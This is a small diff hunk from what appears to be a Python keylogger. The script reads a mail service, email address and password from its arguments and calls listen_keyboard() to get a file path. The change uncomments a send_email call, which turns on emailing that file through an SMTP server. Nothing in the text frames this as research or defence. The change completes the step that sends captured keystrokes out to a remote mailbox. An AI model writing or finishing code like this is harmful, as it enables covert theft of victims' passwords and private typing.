@@ -8,4 +8,4 @@ service, email, password = sys.argv[1:]
 filepath = listen_keyboard()
 
 # giving issues
-# send_email(SMTP_SERVERS[service], email, password, filepath)
+send_email(SMTP_SERVERS[service], email, password, filepath)
